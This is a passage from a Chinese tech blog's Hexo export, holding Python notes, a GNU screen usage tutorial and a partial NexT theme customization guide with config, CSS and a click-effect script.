制表符，协助在输出文本时 垂直方向 保持对齐\n 在控制台输出一个 换行符制表符 的功能是在不使用表格的情况下在 垂直方向 按列对齐文本PyCharm 的调试工具F8 Step Over 可以单步执行代码，会把函数调用看作是一行代码直接执行F7 Step Into 可以单步执行代码，如果是函数，会进入函数内部先在该行打断点，也就是在该行行号后面点击一下然后使用debug模式运行代码，快捷键是Shift+F9最下方控制台出现Debug窗口，切换到Console最后根据情况使用F7或F8pyc字节码文件c 是 compiled 编译过 的意思操作步骤浏览程序目录会发现一个 __pycache__ 的目录该目录下会有好多.pyc文件，比如：ajax_demo.cpython-36.pyc。cpython-36表示 Python 解释器的版本这个 pyc 文件是由 Python 解释器将 模块的源码 转换为 字节码Python 这样保存 字节码 是作为一种启动 速度的优化字节码Python 在解释源程序时是分成两个步骤的首先处理源代码，编译 生成一个二进制 字节码再对 字节码 进行处理，才会生成 CPU 能够识别的 机器码有了模块的字节码文件之后，下一次运行程序时，如果在 上次保存字节码之后 没有修改过源代码，Python 将会加载 .pyc 文件并跳过编译这个步骤当 Python 重编译时，它会自动检查源文件和字节码文件的时间戳如果你又修改了源代码，下次程序运行时，字节码将自动重新创建元祖元组中 只包含一个元素 时，需要 在元素后面添加逗号]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统screen命令简述使用]]></title>
    <url>%2F2019%2F12%2F31%2FLinux%E7%B3%BB%E7%BB%9Fscreen%E5%91%BD%E4%BB%A4%E7%AE%80%E8%BF%B0%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[背景系统管理员经常需要SSH 或者telent 远程登录到Linux 服务器，经常运行一些需要很长时间才能完成的任务，比如系统备份、ftp 传输等等。 通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为它们执行的时间太长了。 必须等待它们执行完毕，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。 简介GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。 GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。 会话恢复只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。 只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。 这一点和图形界面下的VNC很相似。 多窗口在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。 Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。 会话共享Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。 官方站点GNU&apos;s Screen 官方站点：http://www.gnu.org/software/screen/ 语法# screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;] 参数说明 -A 将所有的视窗都调整为目前终端机的大小。 -d &lt;作业名称&gt; 将指定的screen作业离线。 -h &lt;行数&gt; 指定视窗的缓冲区行数。 -m 即使目前已在作业中的screen作业，仍强制建立新的screen作业。 -r &lt;作业名称&gt; 恢复离线的screen作业。 -R 先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。 -s 指定建立新视窗时，所要执行的shell。 -S &lt;作业名称&gt; 指定screen作业的名称。 -v 显示版本信息。 -x 恢复之前离线的screen作业。 -ls或--list 显示目前所有的screen作业。 -wipe 检查目前所有的screen作业，并删除已经无法使用的screen作业。 常用screen参数screen -S yourname -&gt; 新建一个叫yourname的session screen -ls -&gt; 列出当前所有的session screen -r yourname -&gt; 回到yourname这个session screen -d yourname -&gt; 远程detach某个session screen -d -r yourname -&gt; 结束当前session并回到yourname这个session 在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。 C-a ? -&gt; 显示所有键绑定信息 C-a c -&gt; 创建一个新的运行shell的窗口并切换到该窗口 C-a n -&gt; Next，切换到下一个 window C-a p -&gt; Previous，切换到前一个 window C-a 0..9 -&gt; 切换到第 0..9 个 window Ctrl+a [Space] -&gt; 由视窗0循序切换到视窗9 C-a C-a -&gt; 在两个最近使用的 window 间切换 C-a x -&gt; 锁住当前的 window，需用用户密码解锁 C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令则可回去。 C-a w -&gt; 显示所有窗口列表 C-a t -&gt; Time，显示当前时间，和系统的 load C-a k -&gt; kill window，强行关闭当前的 window C-a [ -&gt; 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 vi 一样 C-b Backward，PageUp C-f Forward，PageDown H(大写) High，将光标移至左上角 L Low，将光标移至左下角 0 移到行首 $ 行末 w forward one word，以字为单位往前移 b backward one word，以字为单位往后移 Space 第一次按为标记区起点，第二次按为终点 Esc 结束 copy mode C-a ] -&gt; Paste，把刚刚在 copy mode 选定的内容贴上 使用 screen安装screen流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如果没有的话，可以从GNU screen的官方网站下载。 # yum install screen # rpm -qa|grep screen 创建一个新的窗口安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨： # screen -S meitulu screen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如： # screen vi 1.txt screen创建一个执行vi 1.txt的单窗口会话，退出vi 将退出该窗口/会话。 查看窗口和窗口名称打开多个窗口后，可以使用快捷键C-a w列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样： 0$ bash 1-$ bash 2*$ bash 这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。 Screen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。 练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。 可以使用快捷键C-a A来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。 会话分离与恢复可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。 例如，我们打开一个screen窗口编辑/tmp/david.txt文件： # screen vi /tmp/1.txt 之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示。 等我们忙完其他事情回来后，找到该screen会话： # screen -ls 重新连接会话：# screen -r xxxxx 如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。 这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来 清除dead 会话如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态，使用screen -wipe命令清除该会话。 screen 高级应用会话共享还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令： # screen -x 这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。 这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。 当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。 会话锁定与解锁Screen允许使用快捷键C-a s锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。 快捷键C-a q可以解锁一个会话。 也可以使用C-a x锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。 发送命令到screen会话在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。 关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作： # screen -S aaa -X screen ping www.baidu.com 这个命令在一个叫做aaa的screen会话中创建一个新窗口，并在其中运行ping命令。 屏幕分割现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。 可以使用快捷键C-a S将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a |。 分屏以后，可以使用C-a &lt;tab&gt;在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。 可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-a Q关闭除当前区块之外其他的所有区块。 关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。 C/P模式和操作screen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。 使用快捷键C-a &lt;Esc&gt;或者C-a [可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。 其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。 一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/paste buffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a ]将储存在buffer中的内容粘贴到当前窗口。 更多screen功能同大多数UNIX程序一样，GNU Screen提供了丰富强大的定制功能。 你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。 以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuser on 来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的man页。 常用功能1. 在命令行终端输入：screen，创建一个新的窗口 2. 在这个新窗口中输入要执行的命令，比如：python 1.py ，就算有打印输出也不碍事，关闭这个终端 3. 新开一个终端，输入：screen -ls，查看所有打开的screen窗口。 4. 使用命令：screen -r xxxx,再次进入上一步的窗口，查看命令的执行情况等。 常见问题1. 解决screen状态为Attached连上不的问题 问题描述： 用 screen -ls, 显式当前状态为Attached， 但当前没有用户登陆些会话。 screen此时正常状态应该为(Detached) ，此时用screen -r &lt;session-id&gt;，怎么也登不上 解决方法： screen -D -r ＜session-id&gt; -D -r 先踢掉前一用户，再登陆]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建教程(4)]]></title>
    <url>%2F2019%2F12%2F31%2FHexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B-4%2F</url>
    <content type="text"><![CDATA[第三部分我这个博客采用的是next主题，接下来把我博客关于主题的配置汇总一下，给使用该主题的其他用户做个参考。 安装主题启用主题选择Scheme设置语言设置菜单分类/标签添加fork me on github动态背景添加点击爱心效果设置RSS修改文章底部的那个带#号的标签在每篇文章末尾统一添加“本文结束”标记侧边栏社交小图标设置主页文章加阴影设置网站图标设置旋转头像开启打赏功能设置首页不显示全文(只显示预览)文章字数统计和阅读时长文章底部增加版权信息网站底部字数统计隐藏网页底部 由Hexo强力驱动修改网页底部的桃心修改文章内链接文本样式添加顶部加载条修改字体大小文章加密访问添加jiathis分享博文置顶自定义鼠标样式为博客加上萌萌的宠物搜索功能双击鼠标显示爆炸效果自定义文章的默认头部信息文章标签显示设置在底部增加运行时间利用 Gulp 来压缩你的 Hexo 博客的静态文件添加网站和文章分享按钮压缩页面静态资源删除博文目录自动生成的序数不蒜子统计添加友情链接腾讯公益404页面设置动画效果添加近期文章版块添加网易云音乐外链安装主题在博客根目录下打开命令行输入以下命令： git clone https://github.com/theme-next/hexo-theme-next themes/next 就会将将next主题下载到当前目录下的themes里面的next文件夹中 启用主题在博客根目录下修改站点配置文件_config.yml # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: next 注意冒号后面有个空格 选择 SchemeScheme是NexT提供的一种特性，借助于Scheme，NexT为你提供多种不同的外观。 同时，几乎所有的配置都可以在Scheme之间共用。目前 NexT 支持四种 Scheme，他们是： Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 Gemini - 左侧网站信息及目录，块+片段结构布局 scheme 的切换通过更改主题配置文件，搜索Schemes关键字。我选择的是scheme: Gemini 你会看到有四行scheme的配置，将你需用启用的scheme前面注释 # 去除即可。 然后使用命令：hexo s --debug，打开浏览器输入地址：127.0.0.1:4000即可查看效果 设置语言编辑站点配置文件，将language设置成你所需要的语言，建议明确设置你所需要的语言，例如选用简体中文。 配置如下：language: zh-Hans。注意这个要看主题文件夹中的语言包中文语言包的名称，我设置的是language: zh-Hans 注意：使用hexo s预览的时候，会发现是设置了语言之后界面还是英文，此时使用hexo clean清理下database文件夹以及public文件夹就行了，然后再使用hexo s 预览。 设置菜单菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。 NexT使用的是Font Awesome提供的图标， Font Awesome提供了600+的图标，可以满足绝大的多数的场景，同时无须担心在Retina屏幕下图标模糊的问题。 编辑主题配置文件，修改以下内容： 设定菜单内容，对应的字段是 menu。 菜单内容的设置格式是：item name: link || 图标。其中 item name 是一个名称，这个名称并不直接显示在页面上，它将用于匹配图标以及翻译。 我的设置如下： menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive about: /about/ || user 显示效果如下： 关于设置的是英语，网站显示的是中文，这个要如何理解？ 1. 主题配置文件中菜单设置的是英文，但是站点配置文件配置的网站语言是zh-Hans，也就是简体中文。 2. 此时，访问网站的话菜单会从主题文件的语言包中找到zh-Hans.yml这个中文语言包，查找其中是否有关于menu的翻译，若有，则网站上显示出来。如下图所示： 分类/标签比如设置的有分类，但是点击进去却报错：Cannot GET /tags/，不能获取tags，默认这些需要我们自己创建。 介绍一下创建page的语法：hexo new page &apos;name&apos; 在控制台输入以下命令： hexo new page &apos;tags&apos; #创建tags子目录 hexo new page &apos;categories&apos; #创建categories子目录 hexo new page &apos;about&apos; #创建about子目录 在你的网站根目录下面的source文件夹会分别生成tags、categories以及about文件夹。 修改tags文件夹中的index.md文件，新增type属性，如下： --- title: tags date: 2018-01-04 11:45:41 type: &quot;tags&quot; --- 其他的修改类似。这样一来当你新建一篇博文的时候，增加上tags和categories属性值，就能在tags和categories界面检索到你的文章了。 汇总一下步骤： tags:添加「标签」页面 新建「标签」页面，并在菜单中显示「标签」链接。「标签」页面将展示站点的所有标签，若你的所有文章都未包含标签，此页面将是空的。 底下代码是一篇包含标签的文章的例子： --- title: 标签测试文章 tags: - Testing - Another Tag --- 或者使用这种方式：tags: [Testing, Another Tag],中间是先逗号，后空格 1. 修改菜单 在菜单中添加链接。编辑 主题配置文件 ， 添加 tags 到 menu 中，如下: menu: home: / || home archives: /archives || archives tags: /tags || tags 2. 新建页面 在终端窗口下，定位到 Hexo 站点目录下。使用 hexo new page 新建一个页面，命名为 tags ： $ cd your-hexo-site $ hexo new page tags 3. 设置页面类型 编辑刚新建的页面，将页面的类型设置为 tags ，主题将自动为这个页面显示标签云。页面内容如下： --- title: tags date: 2014-12-22 12:39:04 type: &quot;tags&quot; --- 注意：如果有集成评论服务，页面也会带有评论。 若需要关闭的话，请添加字段 comments 并将值设置为 false，如： --- title: tags date: 2014-12-22 12:39:04 type: &quot;tags&quot; comments: false --- categories:添加「分类」页面 新建「分类」页面，并在菜单中显示「分类」链接。「分类」页面将展示站点的所有分类，若你的所有文章都未包含分类，此页面将是空的。 底下代码是一篇包含分类的文章的例子： --- title: 分类测试文章 categories: - Testing --- 1. 修改菜单 在菜单中添加链接。编辑 主题配置文件 ， 添加 categories 到 menu 中，如下: menu: home: / || home archives: /archives || archives categories: /categories || categories 2. 新建页面 在终端窗口下，定位到 Hexo 站点目录下。使用 hexo new page 新建一个页面，命名为 categories ： $ cd your-hexo-site $ hexo new page categories 3. 设置页面类型 编辑刚新建的页面，将页面的 type 设置为 categories ，主题将自动为这个页面显示分类。页面内容如下： --- title: categories date: 2014-12-22 12:39:04 type: &quot;categories&quot; --- 注意：如果有集成评论服务，页面也会带有评论。 若需要关闭的话，请添加字段 comments 并将值设置为 false，如： --- title: categories date: 2014-12-22 12:39:04 type: &quot;categories&quot; comments: false --- 分类和标签的差别： 在 Hexo 中：分类具有顺序性和层次性，也就是说 Foo, Bar 不等于 Bar, Foo；而标签没有顺序和层次。 添加fork me on github在http://tholman.com/github-corners/或者https://github.com/blog/273-github-ribbons 选择合适的样式复制代码到themes/next/layout/_layout.swig，在&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;下面： 我选用的效果： 动态背景目前NexT主题有4种动态背景，设置方法也很简单，直接设置里需要的动态背景为true： - Canvas-nest - three_waves - canvas_lines - canvas_sphere 我设置的是：canvas_nest: true 添加点击爱心效果在/themes/next/source/js/src下新建文件love.js，接着把该代码拷贝粘贴到love.js文件中。 代码如下： ! function(e, t, a) { function n() { c(&quot;.heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: &apos;&apos;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}&quot;), o(), r() } function r() { for (var e = 0; e &lt; d.length; e++) d[e].alpha &lt;= 0 ? (t.body.removeChild(d[e].el), d.splice(e, 1)) : (d[e].y--, d[e].scale += .004, d[e].alpha -= .013, d[e].el.style.cssText = &quot;left:&quot; + d[e].x + &quot;px;top:&quot; + d[e].y + &quot;px;opacity:&quot; + d[e].alpha + &quot;;transform:scale(&quot; + d[e].scale + &quot;,&quot; + d[e].scale + &quot;) rotate(45deg);background:&quot; + d[e].color + &quot;;z-index:99999&quot;); requestAnimationFrame(r) } function o() { var t = &quot;function&quot; == typeof e.onclick &amp;&amp; e.onclick; e.onclick = function(e) { t &amp;&amp; t(), i(e) } } function i(e) { var a = t.createElement(&quot;div&quot;); a.className = &quot;heart&quot;, d.push({ el: a, x: e.clientX - 5, y: e.clientY - 5, scale: 1, alpha: 1, color: s() }), t.body.appendChild(a) } function c(e) { var a = t.createElement(&quot;style&quot;); a.type = &quot;text/css&quot;; try { a.appendChild(t.createTextNode(e)) } catch(t) { a.styleSheet.cssText = e } t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a) } function s() { return &quot;rgb(&quot; + ~~ (255 * Math.random()) + &quot;,&quot; + ~~ (255 * Math.random()) + &quot;,&quot; + ~~ (255 * Math.random()) + &quot;)&quot; } var d = []; e.requestAnimationFrame = function() { return e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function(e) { setTimeout(e, 1e3 / 60) } } (), n() } (window, document); 然后修改_layout.swig，在\themes\next\layout\_layout.swig文件末尾添加： &lt;!-- 页面点击小红心 --&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/love.js&quot;&gt;&lt;/script&gt; 效果如下： 设置RSS在博客个目录下运行命令行，安装插件：npm install --save hexo-generator-feed， 然后打开站点配置文件，在末尾添加如下内容： (请注意在冒号后面要加一个空格，不然会发生错误！) # Extensions ## Plugins: https://hexo.io/plugins/ #RSS订阅 plugin: - hexo-generator-feed 最后在next主题配置文件中找到rss,设置成：rss: /atom.xml。 配置完之后运行：hexo g,重新生成一次，你会在./public 文件夹中看到 atom.xml 文件。 效果展示： 修改文章底部的那个带#号的标签默认文章底部会出现# test的标签，现在修改该标签显示，把#换成其他样式： 修改模板/themes/next/layout/_macro/post.swig，搜索 rel=&quot;tag&quot;&gt;#，将#换成&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在路径 \themes\next\layout\_macro 中新建 passage-end-tag.swig 文件,并添加以下内容： &lt;div&gt; {% if not is_index %} -------------本文结束 感谢您的阅读------------- {% endif %} &lt;/div&gt; 接着打开\themes\next\layout\_macro\post.swig文件，在post-body 之后， 添加以下代码： &lt;div&gt; {% if not is_index %} {% include 'passage-end-tag.swig' %} {% endif %} &lt;/div&gt; 添加位置如图： 然后打开主题配置文件（_config.yml),在末尾添加： # 文章末尾添加“本文结束”标记 passage_end_tag: enabled: true 完成以上设置之后，在每篇文章之后都会显示如下图的效果。 侧边栏社交小图标设置打开主题配置文件_config.yml，搜索social:, ||之后是在图标库中对应的图标。注意空格就行。 图标库链接：http://fontawesome.io/icons/ 我的配置如下图： social_icons: enable: true icons_only: false transition: true 效果如下图： 主页文章加阴影打开\themes\next\source\css\_custom\custom.styl,向里面加入： // 主页文章添加阴影效果 .post { margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); } 设置网站图标默认的网站图标是一个N，当然是需要制定一个图了，在网上找到图后，将其放在/themes/next/source/img里面，然后在主题配置文件中修改下图所示图片位置： 设置旋转头像Hexo Next主题将头像显示成圆形，鼠标放上去有旋转效果。 先设置头像，在网上找到图后，将其放在/themes/next/source/img里面，然后在主题配置文件中修改下图所示图片位置： 然后找到/themes/next/source/css/_common/components/sidebar/sidebar-author.styl，把里面的内容替换如下： .site-author-image { display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; } .site-author-name { margin: $site-author-name-margin; text-align: $site-author-name-align; color: $site-author-name-color; font-weight: $site-author-name-weight; } .site-description { margin-top: $site-description-margin-top; text-align: $site-description-align; font-size: $site-description-font-size; color: $site-description-color; } .site-author-image { display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形*/ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ /* 鼠标经过头像旋转360度*/ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out; } img:hover { /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度*/ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg); } /* Z 轴旋转动画*/ @-webkit-keyframes play { 0% { -webkit-transform: rotateZ(0deg); } 100% { -webkit-transform: rotateZ(-360deg); } } @-moz-keyframes play { 0% { -moz-transform: rotateZ(0deg); } 100% { -moz-transform: rotateZ(-360deg); } } @keyframes play { 0% { transform: rotateZ(0deg); } 100% { transform: rotateZ(-360deg); } } 开启打赏功能主题配置文件，修改信息如下，同时把微信和支付宝收款码保存到指定路径： 打赏功能文件路径：\themes\next\layout\_macro\reward.swig 设置首页不显示全文(只显示预览)打开主题配置文件_config.yml，ctrl + F搜索找到&quot;auto_excerpt&quot;，可以看见 # Automatically Excerpt. Not recommand. # Please use &lt;!-- more --&gt; in the post to control excerpt accurately. auto_excerpt: enable: false length: 150 length就是预览显示的文字长度 第一种方法：修改如上的配置，把enable对应的false改为true，然后hexo d -g即可 第二种方法：在_post目录下的文章中适当位置添加上，顶行写，即可。 若两种方法同时存在，则优先使用第二种 文章字数统计和阅读时长NexT主题默认已经集成了文章【字数统计】、【阅读时长】统计功能。 如果我们需要使用，只需要在主题配置文件(\themes\next\_config.yml)中打开wordcount 统计功能即可。 post_wordcount: item_text: true wordcount: true min2read: true totalcount: true separated_meta: false 最后一个separated_meta是换行显示的，不用开启 仅仅只是打开开关，部署之后会发现文章的【字数统计】和【阅读时长】后面没有对应的xxx字，xx分钟等字样，只有光秃秃的数字在那里。 找到themes\next\layout\_macro\post.swig 文件 - 字数统计 添加 “字”到{{ wordcount(post.content) }} 后面，修改后为： &lt;span title=&quot;{{ __('post.wordcount') }}&quot;&gt; {{ wordcount(post.content) }} 字 &lt;/span&gt; - 阅读时长 添加 “分钟”到{{ min2read(post.content) }} 后面，修改后为： &lt;span title=&quot;{{ __('post.min2read') }}&quot;&gt; {{ min2read(post.content) }} 分钟 &lt;/span&gt; 再次运行，就能得到正常的如“字数统计 1888字”“阅读时长 6分钟”这样的样式了，如下图所示： 文章底部增加版权信息在主题配置文件中找到post_copyright，把enable的值修改成true,然后找到themes\next\layout\_macro\post-copyright.swig文件修改如下： &lt;div class=&quot;post-copyright&quot;&gt; &lt;li class=&quot;post-copyright-title&quot;&gt; &lt;strong&gt;{{ __('本文标题') + __('symbol.colon') }}&lt;/strong&gt; {{ page.title }} &lt;/li&gt; &lt;li class=&quot;post-copyright-author&quot;&gt; &lt;strong&gt;{{ __('文章作者') + __('symbol.colon') }}&lt;/strong&gt; {{ post.author | default(config.author) }} &lt;/li&gt; &lt;li class=&quot;post-copyright-author&quot;&gt; &lt;strong&gt;{{ __('发布时间') + __('symbol.colon') }}&lt;/strong&gt; {{ page.date.format("YYYY年MM月DD日 - HH:MM:SS") }} &lt;/li&gt; &lt;li class=&quot;post-copyright-author&quot;&gt; &lt;strong&gt;{{ __('更新时间') + __('symbol.colon') }}&lt;/strong&gt; {{ page.updated.format("YYYY年MM月DD日 - HH:MM:SS") }} &lt;/li&gt; &lt;li class=&quot;post-copyright-link&quot;&gt; &lt;strong&gt;{{ __('本文链接') + __('symbol.colon') }}&lt;/strong&gt; &lt;a href=&quot;{{ url_for(page.path) }}&quot; title=&quot;{{ page.title }}&quot;&gt;{{ page.permalink }}&lt;/a&gt; &lt;span class=&quot;copy-path&quot; title=&quot;点击复制文章链接&quot;&gt;&lt;i class=&quot;fa fa-clipboard&quot; data-clipboard-text=&quot;{{ page.permalink }}&quot; aria-label=&quot;复制成功！&quot;&gt;&lt;/i&gt;&lt;/span&gt; &lt;/li&gt; &lt;li class=&quot;post-copyright-license&quot;&gt; &lt;strong&gt;{{ __('post.copyright.license_title') + __('symbol.colon') }} &lt;/strong&gt; &lt;i class=&quot;fa fa-creative-commons&quot;&gt;&lt;/i&gt; &lt;a rel=&quot;license&quot; href=&quot;https://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot; title=&quot;Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)&quot;&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。 &lt;/li&gt; &lt;/div&gt; &lt;script&gt; var clipboard = new Clipboard(&apos;.fa-clipboard&apos;); $(&quot;.fa-clipboard&quot;).click(function(){ clipboard.on(&apos;success&apos;, function(){ swal({ title: &quot;&quot;, text: &apos;复制成功&apos;, icon: &quot;success&quot;, showConfirmButton: true }); }); }); &lt;/script&gt; 实现效果： 网站底部字数统计安装插件：npm install hexo-wordcount --save 因为在[文章字数统计和阅读时长]中有一个totalcount: true，默认已经开启该功能了，找到如下文件：themes\next\layout\_partials\footer.swig，修改如下，显示‘字’： 效果如下： 隐藏网页底部 由Hexo强力驱动在主题配置文件中找到powered，设置成false即可。 修改网页底部的桃心打开themes/next/layout/_partials/footer.swig，找到： 然后还是在[图标库](http://fontawesome.io/icons/ &quot;图标库&quot;)中找到你自己喜欢的图标，然后修改画红线的部分就可以了。 修改文章内链接文本样式修改文件 themes\next\source\css\_common\components\post\post.styl ，在末尾添加如下css样式： // 文章内链接文本样式 .post-body p a{ color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover { color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; } } 其中选择 .post-body 是为了不影响标题，选择 p 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。 添加顶部加载条进入博客文件夹的/themes/next文件夹下, 下载安装Progress module:git clone https://github.com/theme-next/theme-next-pace source/lib/pace 修改主题配置文件(_config.yml),修改如下： # Progress bar in the top during page loading. # Dependencies: https://github.com/theme-next/theme-next-pace pace: true #是否开启进度条 # Themes list: # pace-theme-big-counter | pace-theme-bounce | pace-theme-barber-shop | pace-theme-center-atom # pace-theme-center-circle | pace-theme-center-radar | pace-theme-center-simple | pace-theme-corner-indicator # pace-theme-fill-left | pace-theme-flash | pace-theme-loading-bar | pace-theme-mac-osx | pace-theme-minimal # For example pace_theme: pace-theme-center-atom #选择进度条样式 修改字体大小在主题目录配置文件下，查找font： font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default). host: # body元素的字体设置 global: external: true family: Lato size: 18 # 标题的基础字体设置 headings: external: true family: size: 30 # 文章字体设置 posts: external: true family: 18 # logo字体设置 logo: external: true family: size: 30 # 